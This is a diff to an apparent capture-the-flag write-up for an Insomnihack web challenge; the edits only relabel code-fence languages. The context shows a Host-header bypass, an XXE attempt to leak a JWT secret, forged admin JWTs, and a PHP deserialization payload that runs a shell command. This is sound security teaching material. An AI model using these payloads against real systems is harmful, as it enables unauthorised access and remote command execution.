@@ -24,7 +24,7 @@ It is also running purely on HTTP and not HTTPS, for convenience. What we are se
 
 The site is static and has no links. A common place to look for other endpoitns is `/robots.txt`
 
-```http
+```
 GET /robots.txt HTTP/1.1
 
 HTTP/1.1 200 OK
@@ -51,7 +51,7 @@ Accept-Ranges: bytes
 
 So from this we get a bunch of endpoints and we also know that the server is running nginx. Let's try visiting those endpoints:
 
-```http
+```html
 GET /readme HTTP/1.1
 
 HTTP/1.1 200 OK
@@ -65,7 +65,7 @@ HTTP/1.1 200 OK
 Hostname not allowed
 ```
 
-```http
+```html
 GET /new HTTP/1.1
 
 HTTP/1.1 200 OK
@@ -79,7 +79,7 @@ HTTP/1.1 200 OK
 Hostname not autorized
 ```
 
-```http
+```html
 GET /log HTTP/1.1
 
 HTTP/1.1 200 OK
@@ -93,7 +93,7 @@ HTTP/1.1 200 OK
 Access restricted to admin only
 ```
 
-```http
+```html
 GET /flag.txt HTTP/1.1
 
 HTTP/1.1 403 Forbidden
@@ -101,7 +101,7 @@ HTTP/1.1 403 Forbidden
 Try harder
 ```
 
-```http
+```html
 GET /todo.txt HTTP/1.1
 
 HTTP/1.1 200 OK
@@ -113,7 +113,7 @@ Response headers are similar to the first request, so we omit them from our anal
 
 From the "Hostname" not allowed/authorized message we get the intuition that the request first goes through a load balancer which parses the `Host` HTTP request header before reaching a target back-end server. Tampering with it indeed allows us to bypass the defense:
 
-```http
+```html
 GET /readme HTTP/1.1
 Host: 127.0.0.1
 
@@ -128,7 +128,7 @@ HTTP/1.1 200 OK
 #DEBUG- JWT secret key can now be found in the /www/jwt.secret.txt file
 ```
 
-```http
+```html
 GET /new HTTP/1.1
 Host: 127.0.0.1
 
@@ -174,7 +174,7 @@ async function postData(url = '', data = {}) {
 
 So the `/readme` endpoint reveals us a secret JWT key in `/www/jwt.secret.txt`
 
-```http
+```html
 GET /www/jwt.secret.txt HTTP/1.1
 Host: 127.0.0.1
 
@@ -185,7 +185,7 @@ Try harder
 
 It seems that we cannot simply retrieve it and we have to find another way. But we also unlocked the `/new` endpoint, which is a form submission for a new variant. The form is submitted in the `/api` endpoint and we seem to be able to control the full XML file that is being submitted. Let's try it out:
 
-```http
+```html
 POST /api HTTP/1.1
 Host: pimpmyvariant.insomnihack.ch
 
@@ -223,7 +223,7 @@ Since we have complete control over the XML file, we should attempt an [XXE atta
 
 Let's also analyze the JWT that the server sent us:
 
-```jwt
+```txt
 # Header:
 {
   "alg": "HS256",
@@ -258,7 +258,7 @@ The JWT token seems to include our covid-19 variant guess. The `settings` part i
 
 Tampering with the token to become admin and trying to visit `/log` was not successful, probably because we need to also use JWT secret key. So let's try to use an XXE to leak `/www/jwt.secret.txt`
 
-```http
+```html
 POST /api HTTP/1.1
 
 <?xml version='1.0' encoding='utf-8'?>
@@ -294,7 +294,7 @@ Now let's modify the [above JWT](https://jwt.io/#debugger-io?token=eyJhbGciOiJIU
 
 So let's use our [modified JWT](https://jwt.io/#debugger-io?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2YXJpYW50cyI6WyJBbHBoYSIsIkJldGEiLCJHYW1tYSIsIkRlbHRhIiwiT21pY3JvbiIsIkxhbWJkYSIsIkVwc2lsb24iLCJaZXRhIiwiRXRhIiwiVGhldGEiLCJJb3RhIiwiNTRiMTYzNzgzYzQ2ODgxZjFmZTdlZTA1ZjkwMzM0YWEiXSwic2V0dGluZ3MiOiJhOjE6e2k6MDtPOjQ6XCJVc2VyXCI6Mzp7czo0OlwibmFtZVwiO3M6NTpcImFkbWluXCI7czo3OlwiaXNBZG1pblwiO2I6MTtzOjI6XCJpZFwiO3M6NDA6XCJjZmQ2ZDQwMTA2MWVhNDU2OTFhZjAwY2UwNGQ2MDk3MWE4ZmFmNTdiXCI7fX0iLCJleHAiOjI2NDM2MzM0ODN9.FslN9xPgQpkn1dFKwRZHQTa-lcyMAX7Q2CQfVG12hxc) to make a request to `/log` and bypass the admin check.
 
-```http
+```html
 GET /log HTTP/1.1
 Host: 127.0.0.1
 Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2YXJpYW50cyI6WyJBbHBoYSIsIkJldGEiLCJHYW1tYSIsIkRlbHRhIiwiT21pY3JvbiIsIkxhbWJkYSIsIkVwc2lsb24iLCJaZXRhIiwiRXRhIiwiVGhldGEiLCJJb3RhIiwiNTRiMTYzNzgzYzQ2ODgxZjFmZTdlZTA1ZjkwMzM0YWEiXSwic2V0dGluZ3MiOiJhOjE6e2k6MDtPOjQ6XCJVc2VyXCI6Mzp7czo0OlwibmFtZVwiO3M6NTpcImFkbWluXCI7czo3OlwiaXNBZG1pblwiO2I6MTtzOjI6XCJpZFwiO3M6NDA6XCJjZmQ2ZDQwMTA2MWVhNDU2OTFhZjAwY2UwNGQ2MDk3MWE4ZmFmNTdiXCI7fX0iLCJleHAiOjI2NDM2MzM0ODN9.FslN9xPgQpkn1dFKwRZHQTa-lcyMAX7Q2CQfVG12hxc
@@ -321,7 +321,7 @@ Stack trace:
 
 Awesome! We bypassed the admin check. In the log, we see a PHP error and we also notice the file `/www/UpdateLogViewer.inc`. Let's try accessing it
 
-```http
+```html
 GET /UpdateLogViewer.inc HTTP/1.1
 
 HTTP/1.1 200 OK
@@ -393,7 +393,7 @@ a:2:{i:0;O:4:\"User\":3:{s:4:\"name\";s:5:\"admin\";s:7:\"isAdmin\";b:1;s:2:\"id
 
 So, we create a [malicious JWT](https://jwt.io/#debugger-io?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2YXJpYW50cyI6WyJBbHBoYSIsIkJldGEiLCJHYW1tYSIsIkRlbHRhIiwiT21pY3JvbiIsIkxhbWJkYSIsIkVwc2lsb24iLCJaZXRhIiwiRXRhIiwiVGhldGEiLCJJb3RhIiwiNTRiMTYzNzgzYzQ2ODgxZjFmZTdlZTA1ZjkwMzM0YWEiXSwic2V0dGluZ3MiOiJhOjI6e2k6MDtPOjQ6XCJVc2VyXCI6Mzp7czo0OlwibmFtZVwiO3M6NTpcImFkbWluXCI7czo3OlwiaXNBZG1pblwiO2I6MTtzOjI6XCJpZFwiO3M6NDA6XCJjZmQ2ZDQwMTA2MWVhNDU2OTFhZjAwY2UwNGQ2MDk3MWE4ZmFmNTdiXCI7fWk6MTtPOjE1OlwiVXBkYXRlTG9nVmlld2VyXCI6Mjp7czoxMDpcInBhY2tnZU5hbWVcIjtzOjA6XCJcIjtzOjEyOlwibG9nQ21kUmVhZGVyXCI7czoxOTpcImNhdCAvd3d3L2ZsYWcudHh0ICNcIjt9fSIsImV4cCI6MjY0MzYzMzQ4M30.2Hediv2wh6h8rvHPni9Dpram-wjVfl_hNOsd6YxBXGQ) this time and send it to the server when accessing `/log`
 
-```http
+```html
 GET /log HTTP/1.1
 
 HTTP/1.1 200 OK
